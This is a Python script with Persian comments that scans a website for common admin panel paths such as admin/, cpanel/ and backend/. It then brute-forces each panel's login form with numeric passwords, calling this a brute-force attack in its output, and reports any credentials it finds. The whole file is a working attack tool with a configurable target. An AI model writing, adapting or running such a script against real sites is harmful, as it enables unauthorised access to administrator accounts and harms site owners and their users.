import requests
import itertools
import os

COMMON_ADMIN_PATHS = [
    'admin/', 'admin/login', 'administrator/', 'login/', 'adminpanel/',
    'adminarea/', 'cpanel/', 'backend/', 'panel/', 'manage/'
]

CHARSET = '0123456789'
MAX_PASS_LENGTH = 3


def find_admin_panels(base_url, paths=COMMON_ADMIN_PATHS):
    found = []
    print(f"شروع تست مسیرهای پنل ادمین روی {base_url}\n")
    for path in paths:
        url = base_url.rstrip('/') + '/' + path
        try:
            resp = requests.get(url, timeout=5)
            status = resp.status_code
            print(f"تست مسیر: {url} => پاسخ: {status}")
            if status == 200:
                found.append(url)
        except Exception as e:
            print(f"خطا در دسترسی به {url}: {e}")
    return found


def brute_force_login(admin_url, username, charset=CHARSET, max_len=MAX_PASS_LENGTH):
    session = requests.Session()
    print(f"\nشروع حمله Brute Force روی {admin_url} با نام کاربری '{username}'")
    for length in range(1, max_len + 1):
        for attempt in itertools.product(charset, repeat=length):
            password = ''.join(attempt)
            data = {'username': username, 'password': password}
            try:
                response = session.post(admin_url, data=data, timeout=5)
                # شرط موفقیت باید بر اساس سایت هدف تنظیم بشه
                if "invalid" not in response.text.lower():
                    print(f"[+] پسورد پیدا شد: {password}")
                    return password
            except Exception:
                pass
    print("[-] پسورد پیدا نشد.")
    return None


def main():
    # خواندن از متغیرهای محیطی یا مقدار پیش‌فرض
    site = os.getenv("SITE_URL", "https://example.com")
    username = os.getenv("ADMIN_USER", "admin")

    results = []

    admin_urls = find_admin_panels(site)
    if not admin_urls:
        print("مسیر پنل ادمین پیدا نشد.")
        return

    for url in admin_urls:
        password = brute_force_login(url, username)
        results.append({'admin_url': url, 'password': password})

    print("\n--- گزارش نهایی ---")
    for r in results:
        status = f"پسورد: {r['password']}" if r['password'] else "پسورد پیدا نشد"
        print(f"{r['admin_url']} => {status}")


if __name__ == "__main__":
    main()
